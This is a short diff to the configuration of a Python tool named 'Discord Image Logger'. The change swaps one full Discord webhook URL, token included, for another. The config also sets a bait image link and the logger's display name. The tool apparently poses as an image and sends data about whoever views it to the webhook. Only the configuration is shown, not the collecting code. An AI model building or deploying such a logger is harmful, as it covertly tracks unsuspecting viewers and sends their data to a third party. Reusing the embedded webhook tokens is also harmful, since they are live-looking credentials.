@@ -8,7 +8,7 @@ __app__ = "Discord Image Logger"
 __version__ = "v2.0"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1507858412900192386/AIgW29HVoKf6StR10P2_1bOXONbg6cVd4Ti6jEoQMfzsIOludq3FOUk_tKrtPSo4HwoI",
+    "webhook": "https://discord.com/api/webhooks/1507868979509858444/ijiGfDxt28i7dbuxPnJoDY5QbwpYZ7WVe1CIR_yM5AY23ryTWX6c-XJiNXv9CSv_3LjO",
     "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
     "imageArgument": True,
     "username": "Image Logger",
